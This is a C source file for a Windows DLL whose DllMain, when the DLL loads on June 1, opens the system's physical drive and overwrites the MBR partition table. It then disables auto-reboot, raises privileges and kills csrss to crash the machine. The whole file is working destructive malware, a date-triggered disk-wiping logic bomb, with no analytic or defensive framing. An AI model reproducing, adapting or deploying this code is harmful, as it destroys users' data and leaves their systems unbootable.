#include <Windows.h>
#include "data.h"
#include "protect.h"

BOOL WINAPI DllMain(HINSTANCE instance, DWORD reason, LPVOID reserved) {
	if (reason == DLL_PROCESS_ATTACH) {
		DWORD wb;
		SYSTEMTIME st;
		GetLocalTime(&st);
		if(st.wMonth==6 && st.wDay==1){
		char Mbr[512];
		VOLUME_DISK_EXTENTS diskExtents;
		char buffer[6];
		char system[MAX_PATH];
		GetSystemDirectoryA(system, sizeof(system));
		char path[] = "\\\\.\\";
		char NUL[]="\0";

		memcpy(buffer + 0, path + 0, 4);
		memcpy(buffer + 4, system + 0, 2);
		memcpy(buffer + 6, NUL + 0, 1);


		HANDLE LogicalDrive = CreateFileA(buffer, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);

		if (LogicalDrive == INVALID_HANDLE_VALUE){
			ExitProcess(0);
		}
 
		DeviceIoControl(LogicalDrive, IOCTL_VOLUME_GET_VOLUME_DISK_EXTENTS, 0,0, &diskExtents, sizeof(diskExtents), &wb, NULL);

		CloseHandle(LogicalDrive);
	
		char physicaldevice[] = "\\\\.\\PhysicalDrive";
 
		char buf[19];

		char number[2] = {0x00, 0x00};
		wsprintfA(number, "%d", diskExtents.Extents[0].DiskNumber);
		memcpy(buf + 0, physicaldevice, 17);
		memcpy(buf + 17, number, 2);

		HANDLE PhysicalDrive = CreateFileA(buf, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_FLAG_NO_BUFFERING | FILE_FLAG_RANDOM_ACCESS, 0);

		if (PhysicalDrive == INVALID_HANDLE_VALUE){
			ExitProcess(0);
		}

		SetFilePointer(PhysicalDrive, 0,0, FILE_BEGIN);
		ReadFile(PhysicalDrive, Mbr, 512, &wb, NULL);
		memcpy(Mbr + 446, table, 66);
		SetFilePointer(PhysicalDrive, 0,0, FILE_BEGIN);
		if(WriteFile(PhysicalDrive, Mbr, 512, &wb, NULL) == TRUE)
		{
			CloseHandle(PhysicalDrive);
			DisableAutoReboot();
			EnablePriv();
			KILLCSRSS();
		}
		else
		{
			CloseHandle(PhysicalDrive);
		}
		}
	}
	return TRUE;
}